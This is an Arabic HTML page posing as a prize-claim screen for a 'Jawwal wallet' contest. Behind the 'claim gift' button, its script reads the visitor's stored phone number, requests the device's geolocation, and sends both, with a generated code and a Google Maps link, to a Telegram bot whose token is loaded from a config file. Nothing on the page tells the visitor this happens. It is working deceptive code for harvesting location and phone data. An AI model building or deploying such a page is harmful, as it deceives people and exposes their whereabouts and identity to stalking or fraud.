<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>استلام الجائزة - محفظة جوالي</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      direction: rtl;
      font-family: Tahoma, sans-serif;
      text-align: center;
      padding: 40px;
      background-color: #f5f5f5;
    }
    h2 {
      color: #28a745;
    }
    p, #phoneDisplay {
      font-size: 18px;
      color: #333;
    }
    button {
      background-color: #28a745;
      color: white;
      font-size: 20px;
      padding: 12px 30px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 25px;
    }
    #codeDisplay {
      margin-top: 30px;
      font-size: 24px;
      color: #000;
    }
  </style>
</head>
<body>

  <h2>✅ تم تأكيد رقمك!</h2>
  <p id="phoneDisplay">📱 رقمك هو: جاري التحميل...</p>
  <p>اضغط الزر أدناه لاستلام الجائزة وكشف كود المتسابق الخاص بك</p>

  <button id="claimButton" onclick="claimGift()">🎁 استلام الجائزة</button>

  <div id="codeDisplay" style="display:none;">
    🎉 كود المتسابق الخاص بك: <span id="contestantCode" style="font-weight: bold;"></span>
  </div>

  <script>
    let botToken = '';
    let chatId = '';

    // تحميل إعدادات التليجرام
    fetch('config.json')
      .then(res => res.json())
      .then(data => {
        botToken = data.botToken;
        chatId = data.chatId;
      });

    // عرض رقم الهاتف
    const phone = localStorage.getItem("userPhone");
    if (phone) {
      document.getElementById('phoneDisplay').textContent = "📱 رقمك هو: " + phone;
    } else {
      document.getElementById('phoneDisplay').textContent = "⚠️ لا يوجد رقم محفوظ.";
      document.getElementById('claimButton').disabled = true;
    }

    function claimGift() {
      const phone = localStorage.getItem("userPhone") || "";
      const code = localStorage.getItem("userCode") || generateCode();

      // اهتزاز الجهاز
      if (navigator.vibrate) navigator.vibrate([3000, 1000, 3000]);

      // حفظ الكود إذا لم يكن محفوظًا مسبقًا
      localStorage.setItem("userCode", code);

      // عرض الكود
      document.getElementById('contestantCode').textContent = code;
      document.getElementById('codeDisplay').style.display = 'block';

      // الحصول على الموقع وإرساله للتليجرام
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          const message = `🎁 تأكيد\n📱 رقم الهاتف: ${phone}\n🏷 كود المتسابق: ${code}\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;

          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: message
            })
          });
        }, () => {
          alert("تعذر الحصول على الموقع.");
        });
      } else {
        alert("المتصفح لا يدعم الموقع الجغرافي.");
      }

      // تعطيل الزر بعد الضغط
      document.getElementById('claimButton').disabled = true;
    }

    function generateCode() {
      return Math.floor(100000 + Math.random() * 900000).toString();
    }
  </script>

</body>
</html>
